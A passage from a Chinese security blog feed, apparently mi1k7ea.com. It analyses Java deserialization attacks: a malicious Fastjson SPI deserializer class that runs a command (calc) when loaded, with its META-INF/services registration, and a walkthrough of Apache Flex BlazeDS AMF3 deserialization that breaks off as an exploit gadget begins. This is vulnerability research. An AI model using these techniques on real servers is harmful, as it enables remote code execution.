title="Fastjson反序列化中的SPI"></a>Fastjson反序列化中的SPI</h3><p>Fastjson在反序列化之前，会先获取ObjectDeserializer即对应的对象反序列化解析器。</p><p><strong>ObjectDeserializer</strong>：先根据fieldType获取已缓存的解析器，如果没有则根据fieldClass获取已缓存的解析器，否则根据注解的JSONType获取解析器，否则通过当前线程加载器加载的AutowiredObjectDeserializer查找解析器，否则判断是否为几种常用泛型（比如Collection、Map等），最后通过createJavaBeanDeserializer来创建对应的解析器。</p><p>Fastjson在反序列化的时候支持通过Java的SPI机制扩展新的反序列化解析器，其中该解析器对应的接口类为com.alibaba.fastjson.parser.deserializer.AutowiredObjectDeserializer。</p><p>如果攻击者实现的该接口类的实现类存在恶意代码，且修改了SPI配置文件指向该恶意实现类，那么当服务端在进行Fastjson反序列化的过程中通过SPI机制调用的AutowiredObjectDeserializer接口类的实现类的时候就会导致恶意代码执行。</p><h4 id="Sample-1"><a href="#Sample-1" class="headerlink" title="Sample"></a>Sample</h4><p>环境用jar包是fastjson-1.2.25。</p><p>FJTest.java，实现AutowiredObjectDeserializer接口类，在静态代码块中添加恶意命令执行的操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.DefaultJSONParser;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.deserializer.AutowiredObjectDeserializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Type;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest</span> <span class="keyword">implements</span> <span class="title">AutowiredObjectDeserializer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Set&lt;Type&gt; <span class="title">getAutowiredFor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser defaultJSONParser, Type type, Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getFastMatchToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在META-INF/services目录中新建名为com.alibaba.fastjson.parser.deserializer.AutowiredObjectDeserializer的文件，其中内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.evil.FJTest</span><br></pre></td></tr></table></figure><p>当服务端存在Fastjson反序列化操作时，即可通过SPI触发恶意代码执行。这里假设服务端存在如下Fastjson反序列化操作，即反序列化得到Student类对象：</p><p>Student类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java，服务端进行Fastjson反序列化的程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\"&#125;"</span>;</span><br><span class="line">        Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行Test程序进行正常的反序列化操作，直接触发弹计算器：</p><p><img src="/2019/12/08/浅析Java-SPI安全/7.png" alt=""></p><p>当然，我们本地示例是直接在ClassPath上进行创建META-INF/services目录的相关操作的，这种情景针对于目标服务端环境中，比如Tomcat容器中存在该META-INF/services目录，我们可以通过文件上传漏洞将恶意的SPI配置文件传至该目录中，再上传一个恶意的class导致恶意代码执行；除此之外，还有一种更常见的情景就是，通过jar包的形式来实现，但在实际场景的攻击利用中较为困难，因为目标服务端一般在运行Java Web相关环境时就已经指定好哪些jar加载到Java内存中解析执行，即使我们后面上传也没用。</p><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>直接在恶意代码FJTest中的静态代码块<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>上打断点开始调试。</p><p>运行直接看到如下函数调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;clinit&gt;:12, FJTest (com.evil)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">load:49, ServiceLoader (com.alibaba.fastjson.util)</span><br><span class="line">getDeserializer:475, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">getDeserializer:364, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:636, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:339, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:243, JSON (com.alibaba.fastjson)</span><br><span class="line">main:11, Test</span><br></pre></td></tr></table></figure><p>可以看到，在ParserConfig.getDeserializer()函数调用中，会循环调用ServiceLoader.load()函数即通过SPI机制来到META-INF/services目录中加载AutowiredObjectDeserializer接口类的实现类：</p><p><img src="/2019/12/08/浅析Java-SPI安全/8.png" alt=""></p><p>跟进去ServiceLoader.load()函数，先获取接口类名、拼接出SPI配置文件的路径，然后调用getResources()从SPI配置文件中获取指定的实现类的URL地址，再循环将实现类都加载进来，加载后会调用newInstance()函数来新建该实现类对象实例：</p><p><img src="/2019/12/08/浅析Java-SPI安全/9.png" alt=""></p><p>再往下就是新建类实例的过程中执行了该恶意类的静态代码块的过程从而导致恶意代码执行了。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://zhuanlan.zhihu.com/p/28909673" target="_blank" rel="noopener">Java SPI思想梳理</a></p><p><a href="https://juejin.im/post/5b9b1c115188255c5e66d18c" target="_blank" rel="noopener">理解的Java中SPI机制</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java AMF3反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2019/12/07/Java-AMF3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2019/12/07/Java-AMF3反序列化漏洞/</id>
    <published>2019-12-07T03:36:41.000Z</published>
    <updated>2019-12-07T14:56:27.613Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><p>AMF是Action Message Format的简称，是一种二进制序列化格式，主要用于数据交互和远程过程调用。</p><p>一个Action Message由头部（header）和主体（body）所组成。</p><p>AMF3（Action Message Format version 3）是AMF的第三版，同样是一种二进制信息编码格式，也是Flash应用在后台交互时主要使用的一种数据格式。与JSON类似，它支持不同的数据类型。考虑到向后兼容性，AMF3实际上算是AMF的一种扩展实现，并且引入了新的对象类型。</p><p>AMF3对象的新功能可以归结为两种新增加的特性，即Dynamic和Externalizable，这两种新特性描述了对象是如何进行序列化操作的：</p><ul><li>Dynamic：一个声明了动态特性的类实例，公共变量成员可以在程序运行时动态添加/删除到实例中；</li><li>Externalizable：实现flash.utils.Externalizable并完全控制器成员序列化的类实例；</li></ul><p><strong>Dynamic特性</strong></p><blockquote><p>我们可以拿Dynamic特性与JavaBeans的功能进行对比：它允许我们通过类名及属性来创建一个对象。实际上，很多JavaBeans实体目前已经实现了这种技术，例如java.beans.Introspector、Flamingo、Flex BlazeDS和WebORB等等。</p><p>但需要注意的是，这种功能将会导致一种可利用的漏洞产生。实际上，<a href="http://wouter.coekaerts.be/2011/amf-arbitrary-code-execution" target="_blank" rel="noopener">Wouter Coekaerts早在2011年就已经将这种存在于AMF实现中的漏洞曝光了</a>，并且还在2016年发布了相应漏洞的利用代码及PoC。</p></blockquote><p><strong>Externalizable特性</strong></p><blockquote><p>我们可以拿Externalizable特性赖于Java的java.io.Externalizable接口进行对比。实际上，很多厂商早就已经将flash.utils.IExternalizable接口的规范进行了调整，其实它与Java的java.io.Externalizable区别不大，这种特性将允许我们可以高效地对实现了java.io.Externalizable接口的类进行重构。</p><p>java.io.Externalizable接口定义了两个方法：即readExternal（java.io.ObjectInput）和writeExternal（java.io.ObjectInput），而这两个方法将允许java类完全控制序列化以及反序列化操作。这也就意味着，在程序的运行过程中不存在默认的序列化／反序列化行为以及有效性检测。因此，相对于java.io.Serializable来说，我们使用java.io.Externalizable来实现序列化／反序列化则更加的简单和高效。</p></blockquote><h2 id="0x02-使用AMF3序列化和反序列化"><a href="#0x02-使用AMF3序列化和反序列化" class="headerlink" title="0x02 使用AMF3序列化和反序列化"></a>0x02 使用AMF3序列化和反序列化</h2><p>本地测试用的jar：flex-messaging-core-4.7.2，flex-messaging-common-4.7.2。</p><p>Person类，注意该类需要实现Serializable接口类才能实现序列化和反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.getName()"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.setName()"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.getAge()"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.setAge()"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person [name="</span> + name + <span class="string">", age="</span> + age + <span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AMFDemo.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AMFDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        person.setAge(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化对象，生成AMF Message对象</span></span><br><span class="line">        <span class="keyword">byte</span>[] amf = serialize(person);</span><br><span class="line">        System.out.println(<span class="string">"序列化："</span> + amf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        ActionMessage actionMessage = deserialize(amf);</span><br><span class="line">        System.out.println(<span class="string">"反序列化："</span> + actionMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object data) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        MessageBody body = <span class="keyword">new</span> MessageBody();</span><br><span class="line">        body.setData(data);</span><br><span class="line">        ActionMessage message = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        message.addBody(body);</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        AmfMessageSerializer serializer = <span class="keyword">new</span> AmfMessageSerializer();</span><br><span class="line">        serializer.initialize(SerializationContext.getSerializationContext(), out, <span class="keyword">null</span>);</span><br><span class="line">        serializer.writeMessage(message);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ActionMessage <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] amf)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(amf);</span><br><span class="line">        AmfMessageDeserializer deserializer = <span class="keyword">new</span> AmfMessageDeserializer();</span><br><span class="line">        deserializer.initialize(SerializationContext.getSerializationContext(), in, <span class="keyword">null</span>);</span><br><span class="line">        ActionMessage actionMessage = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        deserializer.readMessage(actionMessage, <span class="keyword">new</span> ActionContext());</span><br><span class="line">        <span class="keyword">return</span> actionMessage;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Person构造函数</span><br><span class="line">Person.setName()</span><br><span class="line">Person.setAge()</span><br><span class="line">Person.getName()</span><br><span class="line">Person.getAge()</span><br><span class="line">序列化：[B@681a9515</span><br><span class="line">Person构造函数</span><br><span class="line">Person.setName()</span><br><span class="line">Person.setAge()</span><br><span class="line">反序列化：flex.messaging.io.amf.ActionMessage@27bc2616</span><br></pre></td></tr></table></figure><h2 id="0x03-AMF3反序列化过程"><a href="#0x03-AMF3反序列化过程" class="headerlink" title="0x03 AMF3反序列化过程"></a>0x03 AMF3反序列化过程</h2><p>在AMF3反序列化过程中，程序会从Action消息中获取类名，构造新的对象，然后以成员值作为参数调用每个成员名对应的setter方法。这一个过程由专门的方法来实现，比如<code>flex.messaging.io.amf.Amf3Input</code>类中的<code>readScriptObject()</code>方法或者<code>flex.messaging.io.amf.Amf0Input</code>类中的<code>readObjectValue()</code>方法。</p><p>在deserialize()函数中，调用了AmfMessageDeserializer.readMessage()函数来读取Action Message内容，而在其中会调用readBody()函数来进一步读取Action Message的主体内容：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/1.png" alt=""></p><p>接着会调用AmfMessageDeserializer.readObject()函数：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/2.png" alt=""></p><p>往下跟进去，看到调用Amf0Input.readObject()，其中获取到type为17，然后调用readObjectValue()：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/3.png" alt=""></p><p>跟进readObjectValue()函数，由于type为17，就会进入调用Amf3Input.readObject()的逻辑：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/4.png" alt=""></p><p>跟进Amf3Input.readObject()函数，这里获取到type为10，再调用Amf3Input.readObjectValue()：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/5.png" alt=""></p><p>跟进Amf3Input.readObjectValue()函数，在AMF3协议中，当type数据类型为10时，则认为Java对象，就会调用readScriptObject()读取对象：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/6.png" alt=""></p><p>跟进readScriptObject()函数，看到调用createObjectInstance()函数来新建对象实例，可以看到是直接创建Person类实例了：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/7.png" alt=""></p><p>在AbstractAmfInput.createObjectInstance()函数中，调用AbstractProxy.createInstance()函数来新建实例：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/8.png" alt=""></p><p>再往下就是具体调用创建对象实例的函数调用过程、调用Person类构造函数。</p><p>此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:7, Person</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">createDefaultInstance:120, ClassUtil (flex.messaging.util)</span><br><span class="line">createInstanceFromClassName:95, AbstractProxy (flex.messaging.io)</span><br><span class="line">createInstance:115, AbstractProxy (flex.messaging.io)</span><br><span class="line">createObjectInstance:169, AbstractAmfInput (flex.messaging.io.amf)</span><br><span class="line">readScriptObject:746, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:40, AMFDemo</span><br><span class="line">main:19, AMFDemo</span><br></pre></td></tr></table></figure><p>继续往下调试，调用完Person类的构造函数创建了对象实例后，程序会返回到Amf3Input.readScriptObject()函数中继续执行，会通过for循环遍历属性并调用BeanProxy.setValue()函数进行属性值的设置：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/9.png" alt=""></p><p>我们跟进几层，看到set()函数是通过反射机制来调用目标属性的setter方法的：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/10.png" alt=""></p><p>往下就是反射调用对应的属性的setter方法，此时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">setName:17, Person</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">set:867, BeanProxy$BeanProperty (flex.messaging.io)</span><br><span class="line">setValue:284, BeanProxy (flex.messaging.io)</span><br><span class="line">readScriptObject:776, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:40, AMFDemo</span><br><span class="line">main:19, AMFDemo</span><br></pre></td></tr></table></figure><p>接着遍历其他属性并反射调用其setter方法直至完成属性值的设置，最后返回对象实例。</p><p>此时可以看到，AMF3将对象方锦龙ActionMessage的body中，其属性值在data可看到：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/11.png" alt=""></p><h2 id="0x04-AMF3反序列化漏洞"><a href="#0x04-AMF3反序列化漏洞" class="headerlink" title="0x04 AMF3反序列化漏洞"></a>0x04 AMF3反序列化漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Flex BlazeDS的4.6.0.23207版本及4.7.x系列&lt;4.7.3版本的都存在反序列化漏洞。</p><p>具体地说，是flex-messaging-xx系列jar包的4.6.0.23207版本及4.7.x系列&lt;4.7.3版本的存在漏洞。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>简单地说，AMF3反序列化漏洞原理就是反序列化调用了JavaBeans存在漏洞的setter方法导致的。</p><h3 id="复现利用"><a href="#复现利用" class="headerlink" title="复现利用"></a>复现利用</h3><h4 id="基于UnicastRef的Gadget"><a href="#基于UnicastRef的Gadget" class="headerlink" title="基于UnicastRef的Gadget"></a>基于UnicastRef的Gadget</h4><p>修改AMFDemo.java，添加生成generateUnicastRef类对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AMFDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span 